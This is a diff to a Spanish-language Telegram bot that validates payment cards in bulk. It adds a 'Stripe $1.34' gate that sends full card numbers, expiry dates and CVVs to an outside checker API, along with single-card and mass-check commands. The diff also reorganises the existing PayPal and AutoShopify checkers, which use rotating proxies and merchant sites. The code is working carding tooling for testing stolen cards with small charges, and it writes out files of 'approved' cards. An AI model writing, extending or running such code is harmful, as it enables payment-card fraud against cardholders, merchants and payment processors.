@@ -531,6 +531,63 @@ def verificar_api_stripe(cc, proxy=None):
             'tiempo': 30
         }
 
+# ==================== NUEVA FUNCIÓN DE VERIFICACIÓN STRIPE $1.34 ====================
+
+def verificar_api_stripe_134(cc, proxy=None):
+    """
+    Verifica usando Stripe $1.34 (endpoint /api/check2) - Gate 2 de Samurai ApiHub
+    """
+    try:
+        api_url = f"https://samurai-api-hub.up.railway.app/api/check2?c={cc}"
+        if proxy:
+            api_url += f"&p={proxy}"
+        
+        start_time = time.time()
+        response = requests.get(api_url, timeout=30)
+        elapsed = time.time() - start_time
+        
+        try:
+            data = response.json()
+            status = data.get('status', 'unknown')
+            message = data.get('message', 'Sin mensaje')
+            gates = data.get('gates', 'stripe 1.34$ charged')
+            amount = data.get('amount', '1.34')
+            
+            return {
+                'success': status == 'success',
+                'status': status,
+                'message': message,
+                'gates': gates,
+                'gate_name': 'Stripe $1.34',
+                'amount': amount,
+                'proxy': proxy if proxy else 'gestionado',
+                'tiempo': elapsed
+            }
+            
+        except json.JSONDecodeError:
+            return {
+                'success': False,
+                'status': 'error',
+                'message': f'HTTP {response.status_code}',
+                'gates': 'stripe error',
+                'gate_name': 'Stripe $1.34',
+                'amount': '1.34',
+                'proxy': proxy if proxy else 'gestionado',
+                'tiempo': elapsed
+            }
+            
+    except Exception as e:
+        return {
+            'success': False,
+            'status': 'error',
+            'message': str(e),
+            'gates': 'stripe error',
+            'gate_name': 'Stripe $1.34',
+            'amount': '1.34',
+            'proxy': proxy if proxy else 'gestionado',
+            'tiempo': 30
+        }
+
 # ==================== FUNCIONES DE VERIFICACIÓN PAYPAL ====================
 
 def verificar_api_paypal(cc, gate=1, proxy=None):
@@ -598,7 +655,7 @@ def verificar_api_paypal(cc, gate=1, proxy=None):
             'tiempo': 30
         }
 
-# ==================== NUEVA FUNCIÓN DE VERIFICACIÓN AUTOSHOPIFY ====================
+# ==================== FUNCIÓN DE VERIFICACIÓN AUTOSHOPIFY ====================
 
 def verificar_api_autoshopify(cc, url, proxy=None):
     """
@@ -900,11 +957,12 @@ def menu_principal():
     btn1 = types.InlineKeyboardButton("💳 Tarjetas", callback_data='menu_tarjetas')
     btn2 = types.InlineKeyboardButton("🌐 Proxies", callback_data='menu_proxies')
     btn3 = types.InlineKeyboardButton("💵 Stripe $1", callback_data='menu_stripe')
-    btn4 = types.InlineKeyboardButton("💰 PayPal", callback_data='menu_paypal')
-    btn5 = types.InlineKeyboardButton("🛍️ AutoShopify", callback_data='menu_shopify')
-    btn6 = types.InlineKeyboardButton("📊 Estadísticas", callback_data='menu_stats')
-    btn7 = types.InlineKeyboardButton("📁 Cargar archivo", callback_data='menu_cargar')
-    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7)
+    btn4 = types.InlineKeyboardButton("💰 Stripe $1.34", callback_data='menu_stripe_134')
+    btn5 = types.InlineKeyboardButton("💰 PayPal", callback_data='menu_paypal')
+    btn6 = types.InlineKeyboardButton("🛍️ AutoShopify", callback_data='menu_shopify')
+    btn7 = types.InlineKeyboardButton("📊 Estadísticas", callback_data='menu_stats')
+    btn8 = types.InlineKeyboardButton("📁 Cargar archivo", callback_data='menu_cargar')
+    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8)
     return markup
 
 def menu_tarjetas():
@@ -959,6 +1017,7 @@ def cmd_menu(message):
         "╠════════════════════════════╣\n"
         "║  Gates disponibles:         ║\n"
         "║  • Stripe: $1.00            ║\n"
+        "║  • Stripe: $1.34 (NUEVO)    ║\n"
         "║  • PayPal: $10/$0.10/$1    ║\n"
         "║  • AutoShopify: variable   ║\n"
         "║                            ║\n"
@@ -972,11 +1031,13 @@ def cmd_menu(message):
         "║                            ║\n"
         "║  Comandos rápidos:          ║\n"
         "║  /check CC - Stripe $1     ║\n"
+        "║  /check134 CC - Stripe $1.34║\n"
         "║  /pp CC - PayPal $10       ║\n"
         "║  /pp2 CC - PayPal $0.10    ║\n"
         "║  /pp3 CC - PayPal $1       ║\n"
         "║  /sh CC - AutoShopify      ║\n"
-        "║  /mass - Stripe masivo     ║\n"
+        "║  /mass - Stripe $1 masivo  ║\n"
+        "║  /mass134 - Stripe $1.34 masivo║\n"
         "║  /mpp - PayPal masivo      ║\n"
         "║  /msh - Shopify masivo     ║\n"
         "╚════════════════════════════╝\n\n"
@@ -995,13 +1056,15 @@ def cmd_help(message):
         "║                            ║\n"
         "║  • Comandos individuales:  ║\n"
         "║    /check CC - Stripe $1   ║\n"
+        "║    /check134 CC - Stripe $1.34║\n"
         "║    /pp CC - PayPal $10     ║\n"
         "║    /pp2 CC - PayPal $0.10  ║\n"
         "║    /pp3 CC - PayPal $1     ║\n"
         "║    /sh CC - AutoShopify    ║\n"
         "║                            ║\n"
         "║  • Comandos masivos:       ║\n"
-        "║    /mass - Stripe masivo   ║\n"
+        "║    /mass - Stripe $1 masivo║\n"
+        "║    /mass134 - Stripe $1.34 masivo║\n"
         "║    /mpp - PayPal masivo    ║\n"
         "║    /msh - Shopify masivo   ║\n"
         "║                            ║\n"
@@ -1082,272 +1145,7 @@ def cmd_del_all_sitios(message):
         reply_markup=confirmacion
     )
 
-# ==================== COMANDOS DE VERIFICACIÓN AUTOSHOPIFY ====================
-
-@bot.message_handler(commands=['sh'])
-def cmd_shopify(message):
-    """Verificar con AutoShopify"""
-    try:
-        partes = message.text.split()
-        cc = partes[1]
-        
-        # Validar formato de tarjeta
-        if len(cc.split('|')) != 4:
-            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
-            return
-        
-        # Obtener sitios disponibles
-        sitios = obtener_sitios()
-        
-        if not sitios:
-            bot.reply_to(message, "❌ No hay sitios guardados. Usa /addsh para agregar uno.")
-            return
-        
-        # Si se proporciona URL específica
-        if len(partes) == 3:
-            url = partes[2]
-            if url not in sitios:
-                bot.reply_to(message, "❌ Sitio no encontrado en tu lista")
-                return
-        else:
-            # Seleccionar sitio aleatorio
-            url = random.choice(sitios)
-        
-        numero = cc.split('|')[0]
-        bin_num = numero[:6]
-        
-        msg = bot.reply_to(message, f"🔍 Verificando con AutoShopify...\nSitio: {url[:30]}...")
-        
-        bin_info = consultar_bin(bin_num)
-        user_name = message.from_user.first_name if message.from_user else "User"
-        
-        proxies = obtener_proxies()
-        mejor_resultado = None
-        
-        if proxies:
-            for proxy in proxies[:3]:
-                resultado = verificar_api_autoshopify(cc, url, proxy)
-                if not mejor_resultado or resultado['success']:
-                    mejor_resultado = resultado
-                time.sleep(1)
-        else:
-            mejor_resultado = verificar_api_autoshopify(cc, url)
-        
-        if mejor_resultado:
-            guardar_historial(cc, mejor_resultado['proxy'], f"Shopify ${mejor_resultado['amount']}", 
-                            mejor_resultado['amount'], mejor_resultado['status'], 
-                            mejor_resultado['message'], mejor_resultado['gates'], bin_info)
-            
-            # Actualizar estadísticas del sitio
-            actualizar_estadisticas_sitio(url, mejor_resultado['success'])
-            
-            texto_premium = formato_check_premium(cc, mejor_resultado, bin_info, mejor_resultado['tiempo'], user_name, "Shopify")
-            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
-        else:
-            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
-        
-    except IndexError:
-        bot.reply_to(message, "❌ Uso: /sh NUMERO|MES|AÑO|CVV [URL]")
-    except Exception as e:
-        bot.reply_to(message, f"❌ Error: {str(e)}")
-
-# ==================== VERIFICACIÓN MASIVA AUTOSHOPIFY ====================
-
-@bot.message_handler(commands=['msh'])
-def cmd_mass_shopify(message):
-    """Verificación masiva con AutoShopify"""
-    
-    tarjetas = obtener_todas_tarjetas()
-    sitios = obtener_sitios()
-    
-    if not tarjetas:
-        bot.reply_to(message, "📭 No hay tarjetas guardadas")
-        return
-    
-    if not sitios:
-        bot.reply_to(message, "📭 No hay sitios guardados. Usa /addsh para agregar.")
-        return
-    
-    # Procesar opciones
-    texto = message.text.split()
-    delay = 3
-    notificar_cada = 10
-    
-    for i, arg in enumerate(texto):
-        if arg == '--delay' and i+1 < len(texto):
-            try:
-                delay = int(texto[i+1])
-            except:
-                pass
-        elif arg == '--notificar' and i+1 < len(texto):
-            try:
-                notificar_cada = int(texto[i+1])
-            except:
-                pass
-    
-    proxies = obtener_proxies()
-    if not proxies:
-        bot.reply_to(message, "⚠️ Sin proxies - Usando modo gestionado")
-    
-    task_id = f"msh_{datetime.now().strftime('%Y%m%d%H%M%S')}_{random.randint(1000,9999)}"
-    
-    active_tasks[task_id] = {
-        'chat_id': message.chat.id,
-        'cancel': False
-    }
-    
-    config = f"""🛍️ VERIFICACIÓN MASIVA SHOPIFY
-━━━━━━━━━━━━━━━━━━━━━━
-📌 Tarjetas: {len(tarjetas)}
-🌐 Sitios: {len(sitios)}
-⏱️ Delay: {delay}s
-🔔 Notificar: cada {notificar_cada}
-🆔 ID: {task_id}
-
-/cancelar_{task_id} - Cancelar"""
-    
-    bot.reply_to(message, config)
-    
-    thread = Thread(target=procesar_verificacion_masiva_shopify, 
-                   args=(task_id, message.chat.id, delay, notificar_cada))
-    thread.daemon = True
-    thread.start()
-
-def procesar_verificacion_masiva_shopify(task_id, chat_id, delay, notificar_cada):
-    """Procesa verificación masiva con AutoShopify"""
-    
-    cards = [c[0] for c in obtener_todas_tarjetas()]
-    sitios = obtener_sitios()
-    total_tarjetas = len(cards)
-    total_sitios = len(sitios)
-    
-    if total_tarjetas == 0 or total_sitios == 0:
-        bot.send_message(chat_id, "📭 No hay tarjetas o sitios suficientes")
-        return
-    
-    msg = bot.send_message(chat_id, "🔄 Iniciando verificación Shopify...")
-    
-    procesadas = 0
-    resultados = {'success': 0, 'failed': 0, 'error': 0}
-    detalles = []
-    start_time = time.time()
-    sitio_index = 0
-    proxy_index = 0
-    
-    proxies = obtener_proxies()
-    
-    for i, card in enumerate(cards, 1):
-        if task_id in active_tasks and active_tasks[task_id].get('cancel'):
-            bot.edit_message_text("🛑 Cancelado", chat_id, msg.message_id)
-            break
-        
-        # Rotación de sitios (round robin)
-        sitio = sitios[sitio_index % total_sitios]
-        sitio_index += 1
-        
-        bin_info = consultar_bin(card[:6])
-        
-        mejor_resultado = None
-        if proxies:
-            # Rotación de proxies
-            proxy = proxies[proxy_index % len(proxies)]
-            proxy_index += 1
-            resultado = verificar_api_autoshopify(card, sitio, proxy)
-            mejor_resultado = resultado
-        else:
-            resultado = verificar_api_autoshopify(card, sitio)
-            mejor_resultado = resultado
-        
-        if mejor_resultado:
-            guardar_historial(card, mejor_resultado['proxy'], f"Shopify ${mejor_resultado['amount']}", 
-                            mejor_resultado['amount'], mejor_resultado['status'], 
-                            mejor_resultado['message'], mejor_resultado['gates'], bin_info)
-            
-            # Actualizar estadísticas del sitio
-            actualizar_estadisticas_sitio(sitio, mejor_resultado['success'])
-            
-            if mejor_resultado['status'] == 'success':
-                resultados['success'] += 1
-                estado_emoji = "✅"
-            elif mejor_resultado['status'] == 'failed':
-                resultados['failed'] += 1
-                estado_emoji = "❌"
-            else:
-                resultados['error'] += 1
-                estado_emoji = "⚠️"
-            
-            detalles.append(f"{estado_emoji} {card} | Sitio: {sitio[:30]}... | {mejor_resultado['status']} | {mejor_resultado['message'][:30]}")
-        
-        procesadas = i
-        
-        # Actualizar cada N tarjetas
-        if i % notificar_cada == 0 or i == total_tarjetas:
-            porcentaje = (i / total_tarjetas) * 100
-            barra = "█" * int(porcentaje/10) + "░" * (10 - int(porcentaje/10))
-            
-            texto = f"""📊 PROGRESO: {i}/{total_tarjetas}
-{barra} {porcentaje:.0f}%
-
-✅ Aprobadas: {resultados['success']}
-❌ Declinadas: {resultados['failed']}
-⚠️ Errores: {resultados['error']}"""
-            
-            try:
-                bot.edit_message_text(texto, chat_id, msg.message_id)
-            except:
-                pass
-        
-        if delay > 0 and i < total_tarjetas:
-            time.sleep(delay)
-    
-    # Generar archivo de resultados
-    tiempo_total = time.time() - start_time
-    minutos = int(tiempo_total // 60)
-    segundos = int(tiempo_total % 60)
-    
-    filename = f"resultados_shopify_{task_id}.txt"
-    with open(filename, 'w', encoding='utf-8') as f:
-        f.write(f"RESULTADOS VERIFICACIÓN SHOPIFY\n")
-        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
-        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-        f.write(f"Total tarjetas: {total_tarjetas}\n")
-        f.write(f"Sitios usados: {total_sitios}\n")
-        f.write(f"Tiempo: {minutos}m {segundos}s\n")
-        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
-        f.write(f"✅ Aprobadas: {resultados['success']}\n")
-        f.write(f"❌ Declinadas: {resultados['failed']}\n")
-        f.write(f"⚠️ Errores: {resultados['error']}\n\n")
-        f.write(f"━━━━ DETALLES ━━━━━━━━━━━━━━\n\n")
-        for d in detalles:
-            f.write(f"{d}\n")
-    
-    # Mensaje final
-    texto_final = f"""✅ VERIFICACIÓN SHOPIFY COMPLETADA
-━━━━━━━━━━━━━━━━━━━━━━
-📊 RESULTADOS:
-✅ Aprobadas: {resultados['success']}
-❌ Declinadas: {resultados['failed']}
-⚠️ Errores: {resultados['error']}
-⏱️ Tiempo: {minutos}m {segundos}s
-
-📁 Se generó archivo con detalles"""
-    
-    try:
-        bot.edit_message_text(texto_final, chat_id, msg.message_id)
-    except:
-        bot.send_message(chat_id, texto_final)
-    
-    # Enviar archivo
-    with open(filename, 'rb') as f:
-        bot.send_document(chat_id, f, caption=f"📊 Resultados Shopify - {total_tarjetas} tarjetas")
-    
-    os.remove(filename)
-    
-    time.sleep(300)
-    if task_id in active_tasks:
-        del active_tasks[task_id]
-
-# ==================== COMANDOS DE VERIFICACIÓN STRIPE ====================
+# ==================== COMANDOS DE VERIFICACIÓN STRIPE $1 ====================
 
 @bot.message_handler(commands=['check'])
 def cmd_check(message):
@@ -1384,13 +1182,60 @@ def cmd_check(message):
             guardar_historial(cc, mejor_resultado['proxy'], 'Stripe', mejor_resultado['amount'], 
                             mejor_resultado['status'], mejor_resultado['message'], mejor_resultado['gates'], bin_info)
             
-            texto_premium = formato_check_premium(cc, mejor_resultado, bin_info, mejor_resultado['tiempo'], user_name, "Stripe")
+            texto_premium = formato_check_premium(cc, mejor_resultado, bin_info, mejor_resultado['tiempo'], user_name, "Stripe $1.00")
             bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
         else:
             bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
         
     except IndexError:
         bot.reply_to(message, "❌ Uso: /check NUMERO|MES|AÑO|CVV")
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error: {str(e)}")
+
+# ==================== NUEVO COMANDO PARA STRIPE $1.34 ====================
+
+@bot.message_handler(commands=['check134', 'ch134'])
+def cmd_check_134(message):
+    """Verificar con Stripe $1.34"""
+    try:
+        cc = message.text.split()[1]
+        
+        partes = cc.split('|')
+        if len(partes) != 4:
+            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
+            return
+        
+        numero = partes[0]
+        bin_num = numero[:6]
+        
+        msg = bot.reply_to(message, "🔍 Verificando con Stripe $1.34 (Gate 2)...")
+        
+        bin_info = consultar_bin(bin_num)
+        user_name = message.from_user.first_name if message.from_user else "User"
+        
+        proxies = obtener_proxies()
+        mejor_resultado = None
+        
+        if proxies:
+            for proxy in proxies[:3]:
+                resultado = verificar_api_stripe_134(cc, proxy)
+                if not mejor_resultado or (resultado['status'] == 'success' and mejor_resultado['status'] != 'success'):
+                    mejor_resultado = resultado
+                time.sleep(1)
+        else:
+            mejor_resultado = verificar_api_stripe_134(cc)
+        
+        if mejor_resultado:
+            guardar_historial(cc, mejor_resultado['proxy'], 'Stripe $1.34', mejor_resultado['amount'], 
+                            mejor_resultado['status'], mejor_resultado['message'], mejor_resultado['gates'], bin_info)
+            
+            texto_premium = formato_check_premium(cc, mejor_resultado, bin_info, mejor_resultado['tiempo'], user_name, "Stripe $1.34")
+            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
+        else:
+            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
+        
+    except IndexError:
+        bot.reply_to(message, "❌ Uso: /check134 NUMERO|MES|AÑO|CVV")
     except Exception as e:
         bot.reply_to(message, f"❌ Error: {str(e)}")
 
@@ -1531,7 +1376,76 @@ def cmd_pp3(message):
     except Exception as e:
         bot.reply_to(message, f"❌ Error: {str(e)}")
 
-# ==================== VERIFICACIÓN MASIVA STRIPE ====================
+# ==================== COMANDOS DE VERIFICACIÓN AUTOSHOPIFY ====================
+
+@bot.message_handler(commands=['sh'])
+def cmd_shopify(message):
+    """Verificar con AutoShopify"""
+    try:
+        partes = message.text.split()
+        cc = partes[1]
+        
+        # Validar formato de tarjeta
+        if len(cc.split('|')) != 4:
+            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
+            return
+        
+        # Obtener sitios disponibles
+        sitios = obtener_sitios()
+        
+        if not sitios:
+            bot.reply_to(message, "❌ No hay sitios guardados. Usa /addsh para agregar uno.")
+            return
+        
+        # Si se proporciona URL específica
+        if len(partes) == 3:
+            url = partes[2]
+            if url not in sitios:
+                bot.reply_to(message, "❌ Sitio no encontrado en tu lista")
+                return
+        else:
+            # Seleccionar sitio aleatorio
+            url = random.choice(sitios)
+        
+        numero = cc.split('|')[0]
+        bin_num = numero[:6]
+        
+        msg = bot.reply_to(message, f"🔍 Verificando con AutoShopify...\nSitio: {url[:30]}...")
+        
+        bin_info = consultar_bin(bin_num)
+        user_name = message.from_user.first_name if message.from_user else "User"
+        
+        proxies = obtener_proxies()
+        mejor_resultado = None
+        
+        if proxies:
+            for proxy in proxies[:3]:
+                resultado = verificar_api_autoshopify(cc, url, proxy)
+                if not mejor_resultado or resultado['success']:
+                    mejor_resultado = resultado
+                time.sleep(1)
+        else:
+            mejor_resultado = verificar_api_autoshopify(cc, url)
+        
+        if mejor_resultado:
+            guardar_historial(cc, mejor_resultado['proxy'], f"Shopify ${mejor_resultado['amount']}", 
+                            mejor_resultado['amount'], mejor_resultado['status'], 
+                            mejor_resultado['message'], mejor_resultado['gates'], bin_info)
+            
+            # Actualizar estadísticas del sitio
+            actualizar_estadisticas_sitio(url, mejor_resultado['success'])
+            
+            texto_premium = formato_check_premium(cc, mejor_resultado, bin_info, mejor_resultado['tiempo'], user_name, "Shopify")
+            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
+        else:
+            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
+        
+    except IndexError:
+        bot.reply_to(message, "❌ Uso: /sh NUMERO|MES|AÑO|CVV [URL]")
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error: {str(e)}")
+
+# ==================== VERIFICACIÓN MASIVA STRIPE $1 ====================
 
 @bot.message_handler(commands=['mass'])
 def cmd_mass_stripe(message):
@@ -1588,7 +1502,7 @@ def cmd_mass_stripe(message):
     thread.start()
 
 def procesar_verificacion_masiva_stripe(task_id, chat_id, delay, notificar_cada):
-    """Procesa verificación masiva con Stripe"""
+    """Procesa verificación masiva con Stripe $1"""
     
     cards = [c[0] for c in obtener_todas_tarjetas()]
     total = len(cards)
@@ -1702,6 +1616,184 @@ def procesar_verificacion_masiva_stripe(task_id, chat_id, delay, notificar_cada)
     # Enviar archivo
     with open(filename, 'rb') as f:
         bot.send_document(chat_id, f, caption=f"📊 Resultados Stripe $1 - {total} tarjetas")
+    
+    os.remove(filename)
+    
+    time.sleep(300)
+    if task_id in active_tasks:
+        del active_tasks[task_id]
+
+# ==================== NUEVA VERIFICACIÓN MASIVA STRIPE $1.34 ====================
+
+@bot.message_handler(commands=['mass134'])
+def cmd_mass_stripe_134(message):
+    """Verificación masiva con Stripe $1.34"""
+    
+    tarjetas = obtener_todas_tarjetas()
+    
+    if not tarjetas:
+        bot.reply_to(message, "📭 No hay tarjetas guardadas")
+        return
+    
+    # Procesar opciones
+    texto = message.text.split()
+    delay = 2
+    notificar_cada = 10
+    
+    for i, arg in enumerate(texto):
+        if arg == '--delay' and i+1 < len(texto):
+            try:
+                delay = int(texto[i+1])
+            except:
+                pass
+        elif arg == '--notificar' and i+1 < len(texto):
+            try:
+                notificar_cada = int(texto[i+1])
+            except:
+                pass
+    
+    proxies = obtener_proxies()
+    if not proxies:
+        bot.reply_to(message, "⚠️ Sin proxies - Usando modo gestionado")
+    
+    task_id = f"mass134_{datetime.now().strftime('%Y%m%d%H%M%S')}_{random.randint(1000,9999)}"
+    
+    active_tasks[task_id] = {
+        'chat_id': message.chat.id,
+        'cancel': False
+    }
+    
+    config = f"""📋 VERIFICACIÓN MASIVA STRIPE $1.34 (GATE 2)
+━━━━━━━━━━━━━━━━━━━━━━
+📌 Tarjetas: {len(tarjetas)}
+⏱️ Delay: {delay}s
+🔔 Notificar: cada {notificar_cada}
+🆔 ID: {task_id}
+
+/cancelar_{task_id} - Cancelar"""
+    
+    bot.reply_to(message, config)
+    
+    thread = Thread(target=procesar_verificacion_masiva_stripe_134, 
+                   args=(task_id, message.chat.id, delay, notificar_cada))
+    thread.daemon = True
+    thread.start()
+
+def procesar_verificacion_masiva_stripe_134(task_id, chat_id, delay, notificar_cada):
+    """Procesa verificación masiva con Stripe $1.34"""
+    
+    cards = [c[0] for c in obtener_todas_tarjetas()]
+    total = len(cards)
+    
+    if total == 0:
+        bot.send_message(chat_id, "📭 No hay tarjetas guardadas")
+        return
+    
+    msg = bot.send_message(chat_id, "🔄 Iniciando verificación Stripe $1.34...")
+    
+    procesadas = 0
+    resultados = {'success': 0, 'failed': 0, 'error': 0}
+    detalles = []
+    start_time = time.time()
+    
+    for i, card in enumerate(cards, 1):
+        if task_id in active_tasks and active_tasks[task_id].get('cancel'):
+            bot.edit_message_text("🛑 Cancelado", chat_id, msg.message_id)
+            break
+        
+        bin_info = consultar_bin(card[:6])
+        proxies = obtener_proxies()
+        
+        mejor_resultado = None
+        if proxies:
+            for proxy in proxies[:2]:
+                resultado = verificar_api_stripe_134(card, proxy)
+                if not mejor_resultado or resultado['status'] == 'success':
+                    mejor_resultado = resultado
+                time.sleep(0.5)
+        else:
+            mejor_resultado = verificar_api_stripe_134(card)
+        
+        if mejor_resultado:
+            guardar_historial(card, mejor_resultado['proxy'], 'Stripe $1.34', mejor_resultado['amount'], 
+                            mejor_resultado['status'], mejor_resultado['message'], mejor_resultado['gates'], bin_info)
+            
+            if mejor_resultado['status'] == 'success':
+                resultados['success'] += 1
+                estado_emoji = "✅"
+            elif mejor_resultado['status'] == 'failed':
+                resultados['failed'] += 1
+                estado_emoji = "❌"
+            else:
+                resultados['error'] += 1
+                estado_emoji = "⚠️"
+            
+            # Guardar detalle
+            detalles.append(f"{estado_emoji} {card} | {mejor_resultado['status']} | {mejor_resultado['message'][:50]} | {mejor_resultado['proxy']}")
+        else:
+            detalles.append(f"❌ {card} | ERROR")
+        
+        procesadas = i
+        
+        # Actualizar cada N tarjetas
+        if i % notificar_cada == 0 or i == total:
+            porcentaje = (i / total) * 100
+            barra = "█" * int(porcentaje/10) + "░" * (10 - int(porcentaje/10))
+            
+            texto = f"""📊 PROGRESO: {i}/{total}
+{barra} {porcentaje:.0f}%
+
+✅ Aprobadas: {resultados['success']}
+❌ Declinadas: {resultados['failed']}
+⚠️ Errores: {resultados['error']}"""
+            
+            try:
+                bot.edit_message_text(texto, chat_id, msg.message_id)
+            except:
+                pass
+        
+        if delay > 0 and i < total:
+            time.sleep(delay)
+    
+    # Generar archivo de resultados
+    tiempo_total = time.time() - start_time
+    minutos = int(tiempo_total // 60)
+    segundos = int(tiempo_total % 60)
+    
+    filename = f"resultados_stripe134_{task_id}.txt"
+    with open(filename, 'w', encoding='utf-8') as f:
+        f.write(f"RESULTADOS VERIFICACIÓN STRIPE $1.34\n")
+        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
+        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+        f.write(f"Total tarjetas: {total}\n")
+        f.write(f"Tiempo: {minutos}m {segundos}s\n")
+        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
+        f.write(f"✅ Aprobadas: {resultados['success']}\n")
+        f.write(f"❌ Declinadas: {resultados['failed']}\n")
+        f.write(f"⚠️ Errores: {resultados['error']}\n\n")
+        f.write(f"━━━━ DETALLES ━━━━━━━━━━━━━━\n\n")
+        for d in detalles:
+            f.write(f"{d}\n")
+    
+    # Mensaje final
+    texto_final = f"""✅ VERIFICACIÓN STRIPE $1.34 COMPLETADA
+━━━━━━━━━━━━━━━━━━━━━━
+📊 RESULTADOS:
+✅ Aprobadas: {resultados['success']}
+❌ Declinadas: {resultados['failed']}
+⚠️ Errores: {resultados['error']}
+⏱️ Tiempo: {minutos}m {segundos}s
+
+📁 Se generó archivo con detalles"""
+    
+    try:
+        bot.edit_message_text(texto_final, chat_id, msg.message_id)
+    except:
+        bot.send_message(chat_id, texto_final)
+    
+    # Enviar archivo
+    with open(filename, 'rb') as f:
+        bot.send_document(chat_id, f, caption=f"📊 Resultados Stripe $1.34 - {total} tarjetas")
     
     os.remove(filename)
     
@@ -1922,6 +2014,202 @@ def procesar_verificacion_masiva_paypal(task_id, chat_id, delay, notificar_cada)
     if task_id in active_tasks:
         del active_tasks[task_id]
 
+# ==================== VERIFICACIÓN MASIVA AUTOSHOPIFY ====================
+
+@bot.message_handler(commands=['msh'])
+def cmd_mass_shopify(message):
+    """Verificación masiva con AutoShopify"""
+    
+    tarjetas = obtener_todas_tarjetas()
+    sitios = obtener_sitios()
+    
+    if not tarjetas:
+        bot.reply_to(message, "📭 No hay tarjetas guardadas")
+        return
+    
+    if not sitios:
+        bot.reply_to(message, "📭 No hay sitios guardados. Usa /addsh para agregar.")
+        return
+    
+    # Procesar opciones
+    texto = message.text.split()
+    delay = 3
+    notificar_cada = 10
+    
+    for i, arg in enumerate(texto):
+        if arg == '--delay' and i+1 < len(texto):
+            try:
+                delay = int(texto[i+1])
+            except:
+                pass
+        elif arg == '--notificar' and i+1 < len(texto):
+            try:
+                notificar_cada = int(texto[i+1])
+            except:
+                pass
+    
+    proxies = obtener_proxies()
+    if not proxies:
+        bot.reply_to(message, "⚠️ Sin proxies - Usando modo gestionado")
+    
+    task_id = f"msh_{datetime.now().strftime('%Y%m%d%H%M%S')}_{random.randint(1000,9999)}"
+    
+    active_tasks[task_id] = {
+        'chat_id': message.chat.id,
+        'cancel': False
+    }
+    
+    config = f"""🛍️ VERIFICACIÓN MASIVA SHOPIFY
+━━━━━━━━━━━━━━━━━━━━━━
+📌 Tarjetas: {len(tarjetas)}
+🌐 Sitios: {len(sitios)}
+⏱️ Delay: {delay}s
+🔔 Notificar: cada {notificar_cada}
+🆔 ID: {task_id}
+
+/cancelar_{task_id} - Cancelar"""
+    
+    bot.reply_to(message, config)
+    
+    thread = Thread(target=procesar_verificacion_masiva_shopify, 
+                   args=(task_id, message.chat.id, delay, notificar_cada))
+    thread.daemon = True
+    thread.start()
+
+def procesar_verificacion_masiva_shopify(task_id, chat_id, delay, notificar_cada):
+    """Procesa verificación masiva con AutoShopify"""
+    
+    cards = [c[0] for c in obtener_todas_tarjetas()]
+    sitios = obtener_sitios()
+    total_tarjetas = len(cards)
+    total_sitios = len(sitios)
+    
+    if total_tarjetas == 0 or total_sitios == 0:
+        bot.send_message(chat_id, "📭 No hay tarjetas o sitios suficientes")
+        return
+    
+    msg = bot.send_message(chat_id, "🔄 Iniciando verificación Shopify...")
+    
+    procesadas = 0
+    resultados = {'success': 0, 'failed': 0, 'error': 0}
+    detalles = []
+    start_time = time.time()
+    sitio_index = 0
+    proxy_index = 0
+    
+    proxies = obtener_proxies()
+    
+    for i, card in enumerate(cards, 1):
+        if task_id in active_tasks and active_tasks[task_id].get('cancel'):
+            bot.edit_message_text("🛑 Cancelado", chat_id, msg.message_id)
+            break
+        
+        # Rotación de sitios (round robin)
+        sitio = sitios[sitio_index % total_sitios]
+        sitio_index += 1
+        
+        bin_info = consultar_bin(card[:6])
+        
+        mejor_resultado = None
+        if proxies:
+            # Rotación de proxies
+            proxy = proxies[proxy_index % len(proxies)]
+            proxy_index += 1
+            resultado = verificar_api_autoshopify(card, sitio, proxy)
+            mejor_resultado = resultado
+        else:
+            resultado = verificar_api_autoshopify(card, sitio)
+            mejor_resultado = resultado
+        
+        if mejor_resultado:
+            guardar_historial(card, mejor_resultado['proxy'], f"Shopify ${mejor_resultado['amount']}", 
+                            mejor_resultado['amount'], mejor_resultado['status'], 
+                            mejor_resultado['message'], mejor_resultado['gates'], bin_info)
+            
+            # Actualizar estadísticas del sitio
+            actualizar_estadisticas_sitio(sitio, mejor_resultado['success'])
+            
+            if mejor_resultado['status'] == 'success':
+                resultados['success'] += 1
+                estado_emoji = "✅"
+            elif mejor_resultado['status'] == 'failed':
+                resultados['failed'] += 1
+                estado_emoji = "❌"
+            else:
+                resultados['error'] += 1
+                estado_emoji = "⚠️"
+            
+            detalles.append(f"{estado_emoji} {card} | Sitio: {sitio[:30]}... | {mejor_resultado['status']} | {mejor_resultado['message'][:30]}")
+        
+        procesadas = i
+        
+        # Actualizar cada N tarjetas
+        if i % notificar_cada == 0 or i == total_tarjetas:
+            porcentaje = (i / total_tarjetas) * 100
+            barra = "█" * int(porcentaje/10) + "░" * (10 - int(porcentaje/10))
+            
+            texto = f"""📊 PROGRESO: {i}/{total_tarjetas}
+{barra} {porcentaje:.0f}%
+
+✅ Aprobadas: {resultados['success']}
+❌ Declinadas: {resultados['failed']}
+⚠️ Errores: {resultados['error']}"""
+            
+            try:
+                bot.edit_message_text(texto, chat_id, msg.message_id)
+            except:
+                pass
+        
